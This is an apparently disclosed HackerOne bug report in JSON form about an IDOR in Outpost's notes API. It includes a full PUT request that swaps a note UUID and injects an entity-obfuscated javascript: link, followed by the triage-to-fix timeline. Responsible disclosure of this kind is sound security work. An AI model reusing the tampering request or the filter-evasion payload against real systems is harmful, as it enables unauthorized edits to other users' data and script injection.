@@ -1,0 +1,475 @@
+{
+    "id": 914331,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MTQzMzE=",
+    "url": "https://hackerone.com/reports/914331",
+    "title": "IDOR on notes to HTML injection",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "medium",
+    "readable_substate": "Resolved",
+    "created_at": "2020-07-02T20:12:45.901Z",
+    "submitted_at": "2020-07-02T20:12:45.901Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "ph-hitachi",
+        "url": "/ph-hitachi",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/tzsR6qZmmurZ7otM34UESG9d/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 42327,
+        "url": "https://hackerone.com/palo_alto_software",
+        "handle": "palo_alto_software",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/042/327/6b83191758494b9c630b6ba94f088d0c78829602_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/042/327/6b83191758494b9c630b6ba94f088d0c78829602_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": false,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Palo Alto Software",
+            "twitter_handle": "",
+            "website": "https://paloalto.com",
+            "about": ""
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": false,
+    "disclosed_at": "2020-11-26T03:37:41.122Z",
+    "bug_reporter_agreed_on_going_public_at": "2020-11-25T06:12:15.402Z",
+    "team_member_agreed_on_going_public_at": "2020-11-26T03:37:41.016Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "## Summary:\nTeam member with role USER can change notes of any users and also we able to inject some html tags \n\n## Steps To Reproduce:\n\n  1. Login in with role `owner` create `note`\n  1. login team member with  role `users`\n  1. add `note` and capture with `burp suite` and change the uuid of `notes``\n\n\n```\nPUT /api/v1/note/b9db186a-c0af-462d-ad71-c30c2bfd7cf5 HTTP/1.1\nHost: api.outpost.co\nConnection: close\nContent-Length: 102\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36\nX-Requested-With: XMLHttpRequest\nContent-Type: application/json\nAccept: */*\nOrigin: https://app.outpost.co\nSec-Fetch-Site: same-site\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://app.outpost.co/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,ru;q=0.8,th;q=0.7\nCookie:  <authentacation_cookies>\n\n{\"body\":\"<h1><a href=\\\"j&#97v&#97script&#x3A;&#97lert(1)\\\">This is a test</a></h1>\",\"mentionUuids\":[]}\n```\n\n### Response:\n```json\n{\n  \"body\": \"<h1><a href=\\\"j&amp;#97v&amp;#97script:&amp;#97lert%281%29\\\" rel=\\\"nofollow\\\">This is a test</a></h1>\",\n  \"uuid\": \"b9db186a-c0af-462d-ad71-c30c2bfd7cf5\",\n  \"conversationUuid\": \"78a8df65-aaa0-4384-9dfe-ab6120f3737f\",\n  \"createdBy\": {\n    \"uuid\": \"b065722c-09b4-45f2-8ee3-4a4a8a92080f\",\n    \"displayName\": \"justin\",\n    \"firstName\": \"justin\",\n    \"lastName\": \"lee\",\n    \"isDeleted\": false,\n    \"gravatarHash\": \"630369207d5b093d4d57dcda07d6c22f\",\n    \"avatarColor\": \"ORANGE\"\n  },\n  \"modifiedBy\": {\n    \"uuid\": \"7d2f671b-ed97-4a2b-8bb3-8d7538e73e34\",\n    \"displayName\": \"Attacker\",\n    \"firstName\": \"Attacker\",\n    \"lastName\": \"1\",\n    \"isDeleted\": false,\n    \"gravatarHash\": \"f33c9e2461140f5fd594a1870dfdf980\",\n    \"avatarColor\": \"PURPLE\"\n  },\n  \"createdDate\": 1593549551704,\n  \"modifiedDate\": 1593719773232,\n  \"status\": \"DEFAULT\"\n}\n```\n{F891966}\n\n## Impact\n\nusing this the user can edit any note of member or inject some malicious html content",
+    "weakness": {
+        "id": 55,
+        "name": "Insecure Direct Object Reference (IDOR)"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 891965,
+            "file_name": "IDOR.PNG",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/DFjkQpBT7aPPjeNCqnpKztYV?response-content-disposition=attachment%3B%20filename%3D%22IDOR.PNG%22%3B%20filename%2A%3DUTF-8%27%27IDOR.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7PPOFRYH%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071641Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDcuK2E%2FeBtcmHicTSkhVyjBZRhvXgDr5cxtx4vV4u3TwIhAPcmogSpSjjTlng6tRjObjfLwEz1As%2FUe5ruIXl0QjmKKrsFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igw%2FTPgLvjhyB7aPxq0qjwXBBaLijeuFCgI91hxvzqPgckmc0Lfqepa2wgQd1cBU5mwD8sfW05flnej41A3%2FkwJ%2BHCOg6feQz6M3b3wctZPWWrZsRrWHZNH7e7IWHhzILiT1wQp5LBdKlFXyKY9cGIBTg4LYVikvoipMINr%2FN5Z6MLk6wW3jYfvdd%2BOgc%2BZVWsAKNl4fXyiBw2xtNootTzFiHdGAiZPblakyq41iAqPJEqRhhUAVDb07yhyks%2FplW%2FDUTLygRi8FVvt0rIPd4BU0JFXTOBXpl5AY%2FzkAtI58ESan2dfFiFa4N0VjxjrNmgqh%2Fa%2FC4mO6WLKbumSDyJcwQuOyBF%2FGXAd5usxkxdihmZguN5muvJX2%2FgwlcNWxO7F1t3QKoGbGtYAphXVbx%2BrRwShjp%2FF%2ByMZ%2BMaTVIMhuD6MStsdurN8UEk1rG1ypBWYAqHa9OC24jSvt%2F1Mgj6mXOdh%2F4btunDJPyfFziACa1f0hKZgUAabilcHG8oEWr3Cr9b7RhdKJncUoo2RMuxSW1yFa%2B41XRlb2eccLBpYJCpZKMA8wHUb%2FxrEkH50wh6n22MFP4V10Cg5MO0xcmO5aFhdyXGDQI5tvU%2BlPIe70HpIDV%2FI7rHdtk0ZpkWpopZ0HwVayMvPqltF4tLIgg2d7jSEPwNIql7zydMd6a531MKL%2BpYitZqJ9eNULbetVUWIXCcspoUMcZZj%2FjTj9gloHaPWqgGrHfJKcQ9Ca8qWI3RztFdV%2F3EgjZiSWcJrEGx6HhPvSzhZ3lwqV3Bc3LcasmZOrGtf7qIeaii8UEJmUGDDu5PPWUsuJA%2FfMGR3XnmJ847cEi5EPiBjRBnqokt8%2FLUUrzn6SVzY56l%2BU421JGIcpg7OstvQxQKzcnuz9MNOxtqcGOrAB04a8Utcy3izWWYdlHDGCb1%2FLaGmIeDpKghOtKPNkUGqUthcmjbMCZd%2BSvMduJxU6nQ4wZXMCPHdYijZwvexQR0MWno8IjanZgLWiKrc2aXDHRG%2FXZ17DHs2udeqqlK9iINIjU%2BgR6QXF1fQu%2BFhQ0hE8Y5R3nYM54tfdfcGO8zuYENygVg3aRibV3lNZiKI%2Fg8bdVtHwqlGgOpSfZdyveCo6jx5tJEPA5jQTGUbQuVA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1b81e5f8905a5edfa0c3bf5fe4d3e16e1bdfcda732326984cd4f93ef1332dbbd",
+            "file_size": 69123,
+            "type": "image/png"
+        },
+        {
+            "id": 891966,
+            "file_name": "poc.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/FWgM5vr9oiTPS8yF9dXcduai?response-content-disposition=attachment%3B%20filename%3D%22poc.png%22%3B%20filename%2A%3DUTF-8%27%27poc.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7PPOFRYH%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071641Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDcuK2E%2FeBtcmHicTSkhVyjBZRhvXgDr5cxtx4vV4u3TwIhAPcmogSpSjjTlng6tRjObjfLwEz1As%2FUe5ruIXl0QjmKKrsFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igw%2FTPgLvjhyB7aPxq0qjwXBBaLijeuFCgI91hxvzqPgckmc0Lfqepa2wgQd1cBU5mwD8sfW05flnej41A3%2FkwJ%2BHCOg6feQz6M3b3wctZPWWrZsRrWHZNH7e7IWHhzILiT1wQp5LBdKlFXyKY9cGIBTg4LYVikvoipMINr%2FN5Z6MLk6wW3jYfvdd%2BOgc%2BZVWsAKNl4fXyiBw2xtNootTzFiHdGAiZPblakyq41iAqPJEqRhhUAVDb07yhyks%2FplW%2FDUTLygRi8FVvt0rIPd4BU0JFXTOBXpl5AY%2FzkAtI58ESan2dfFiFa4N0VjxjrNmgqh%2Fa%2FC4mO6WLKbumSDyJcwQuOyBF%2FGXAd5usxkxdihmZguN5muvJX2%2FgwlcNWxO7F1t3QKoGbGtYAphXVbx%2BrRwShjp%2FF%2ByMZ%2BMaTVIMhuD6MStsdurN8UEk1rG1ypBWYAqHa9OC24jSvt%2F1Mgj6mXOdh%2F4btunDJPyfFziACa1f0hKZgUAabilcHG8oEWr3Cr9b7RhdKJncUoo2RMuxSW1yFa%2B41XRlb2eccLBpYJCpZKMA8wHUb%2FxrEkH50wh6n22MFP4V10Cg5MO0xcmO5aFhdyXGDQI5tvU%2BlPIe70HpIDV%2FI7rHdtk0ZpkWpopZ0HwVayMvPqltF4tLIgg2d7jSEPwNIql7zydMd6a531MKL%2BpYitZqJ9eNULbetVUWIXCcspoUMcZZj%2FjTj9gloHaPWqgGrHfJKcQ9Ca8qWI3RztFdV%2F3EgjZiSWcJrEGx6HhPvSzhZ3lwqV3Bc3LcasmZOrGtf7qIeaii8UEJmUGDDu5PPWUsuJA%2FfMGR3XnmJ847cEi5EPiBjRBnqokt8%2FLUUrzn6SVzY56l%2BU421JGIcpg7OstvQxQKzcnuz9MNOxtqcGOrAB04a8Utcy3izWWYdlHDGCb1%2FLaGmIeDpKghOtKPNkUGqUthcmjbMCZd%2BSvMduJxU6nQ4wZXMCPHdYijZwvexQR0MWno8IjanZgLWiKrc2aXDHRG%2FXZ17DHs2udeqqlK9iINIjU%2BgR6QXF1fQu%2BFhQ0hE8Y5R3nYM54tfdfcGO8zuYENygVg3aRibV3lNZiKI%2Fg8bdVtHwqlGgOpSfZdyveCo6jx5tJEPA5jQTGUbQuVA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=245e9858ca13e286c5500028c7411abbdaa667a038beacc326b005f1108bbac9",
+            "file_size": 11845,
+            "type": "image/png"
+        }
+    ],
+    "allow_singular_disclosure_at": "2020-12-25T06:12:15.465Z",
+    "allow_singular_disclosure_after": -84416665.80835637,
+    "singular_disclosure_allowed": true,
+    "vote_count": 15,
+    "voters": [
+        "echidonut",
+        "bombon",
+        "locs3c",
+        "h4x0r_dz",
+        "akashhamal0x01",
+        "demonia",
+        "zerox4",
+        "eissen5c",
+        "ayokio",
+        "lokiiii",
+        "and 5 more..."
+    ],
+    "severity": {
+        "rating": "medium",
+        "author_type": "User"
+    },
+    "structured_scope": {
+        "databaseId": 41780,
+        "asset_type": "URL",
+        "asset_identifier": "api.outpost.co",
+        "max_severity": "none"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 8522571,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "hello any updates?",
+            "automated_response": false,
+            "created_at": "2020-07-07T01:59:55.749Z",
+            "updated_at": "2020-07-07T01:59:55.749Z",
+            "actor": {
+                "username": "ph-hitachi",
+                "cleared": false,
+                "verified": false,
+                "url": "/ph-hitachi",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tzsR6qZmmurZ7otM34UESG9d/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 8531341,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "sorry, we got a bit behind on issues over the holiday weekend. I'll assign this to the team, it may be a duplicate but I can't recall off the top of my head",
+            "automated_response": false,
+            "created_at": "2020-07-07T20:36:10.895Z",
+            "updated_at": "2020-07-07T20:36:10.895Z",
+            "actor": {
+                "username": "staffors",
+                "cleared": false,
+                "verified": false,
+                "url": "/staffors",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/AcHK4sXdMg6i5MGGWMQNUCKG/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 8532395,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "hi @staffors,\n\ni understand thanks for reponse and Triaged my report \n\nbest,\nthanks,",
+            "automated_response": false,
+            "created_at": "2020-07-07T22:49:16.102Z",
+            "updated_at": "2020-07-07T22:49:16.102Z",
+            "actor": {
+                "username": "ph-hitachi",
+                "cleared": false,
+                "verified": false,
+                "url": "/ph-hitachi",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tzsR6qZmmurZ7otM34UESG9d/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 8555484,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@ph-hitachi, confirming that this is a valid and unique report. Thanks for letting us know. Fixing this is fairly low priority, as the issue is constrained to members of a team, so will likely be a while before we get to this. Will update this report when we address the issue. Best.",
+            "automated_response": false,
+            "created_at": "2020-07-10T01:16:33.357Z",
+            "updated_at": "2020-07-10T01:16:33.357Z",
+            "actor": {
+                "username": "kad3nce",
+                "cleared": false,
+                "verified": false,
+                "url": "/kad3nce",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 8566348,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "hi @kad3nce \n\nThanks for response actually IDOR is High Severity but in this case, this low impact so i understand.\n\nThanks,\n   ",
+            "automated_response": false,
+            "created_at": "2020-07-11T03:11:16.012Z",
+            "updated_at": "2020-07-11T03:11:16.012Z",
+            "actor": {
+                "username": "ph-hitachi",
+                "cleared": false,
+                "verified": false,
+                "url": "/ph-hitachi",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tzsR6qZmmurZ7otM34UESG9d/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 8658890,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@ph-hitachi, yes. If I'm understanding H1's setup correctly, you'll get reputation points when we resolve the duplicate report.",
+            "automated_response": false,
+            "created_at": "2020-07-20T23:01:12.113Z",
+            "updated_at": "2020-07-20T23:01:12.113Z",
+            "actor": {
+                "username": "kad3nce",
+                "cleared": false,
+                "verified": false,
+                "url": "/kad3nce",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 8660209,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "ok thanks,",
+            "automated_response": false,
+            "created_at": "2020-07-21T06:14:18.162Z",
+            "updated_at": "2020-07-21T06:14:18.162Z",
+            "actor": {
+                "username": "ph-hitachi",
+                "cleared": false,
+                "verified": false,
+                "url": "/ph-hitachi",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tzsR6qZmmurZ7otM34UESG9d/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 9335629,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-09-26T01:07:46.349Z",
+            "updated_at": "2020-09-26T01:07:46.349Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 987097
+            },
+            "actor": {
+                "username": "palakmahipal",
+                "cleared": false,
+                "verified": false,
+                "url": "/palakmahipal",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/BBWKSQb6vY7Grg55mtxi5nsk/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 9891759,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "hello asking for any updates?",
+            "automated_response": false,
+            "created_at": "2020-11-22T15:14:16.498Z",
+            "updated_at": "2020-11-22T15:14:16.498Z",
+            "actor": {
+                "username": "ph-hitachi",
+                "cleared": false,
+                "verified": false,
+                "url": "/ph-hitachi",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tzsR6qZmmurZ7otM34UESG9d/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 9918558,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "@ph-hitachi, we just deployed a fix for this, if you're interested in confirming it. Thanks again for your help!",
+            "automated_response": false,
+            "created_at": "2020-11-25T01:47:50.573Z",
+            "updated_at": "2020-11-25T01:47:50.573Z",
+            "actor": {
+                "username": "kad3nce",
+                "cleared": false,
+                "verified": false,
+                "url": "/kad3nce",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "ph-hitachi",
+                "url": "/ph-hitachi"
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 9919363,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "disclose?",
+            "automated_response": false,
+            "created_at": "2020-11-25T06:12:15.423Z",
+            "updated_at": "2020-11-25T06:12:15.423Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "ph-hitachi",
+                "cleared": false,
+                "verified": false,
+                "url": "/ph-hitachi",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tzsR6qZmmurZ7otM34UESG9d/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 9929782,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-11-26T03:37:41.044Z",
+            "updated_at": "2020-11-26T03:37:41.044Z",
+            "actor": {
+                "username": "kad3nce",
+                "cleared": false,
+                "verified": false,
+                "url": "/kad3nce",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 9929783,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-11-26T03:37:41.147Z",
+            "updated_at": "2020-11-26T03:37:41.147Z",
+            "actor": {
+                "username": "kad3nce",
+                "cleared": false,
+                "verified": false,
+                "url": "/kad3nce",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 10541969,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserRemoved",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-02-01T18:29:15.904Z",
+            "updated_at": "2021-02-01T18:29:15.904Z",
+            "actor": {
+                "username": "palakmahipal",
+                "cleared": false,
+                "verified": false,
+                "url": "/palakmahipal",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/BBWKSQb6vY7Grg55mtxi5nsk/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "removed_user": {
+                "url": "/palakmahipal",
+                "username": "palakmahipal"
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
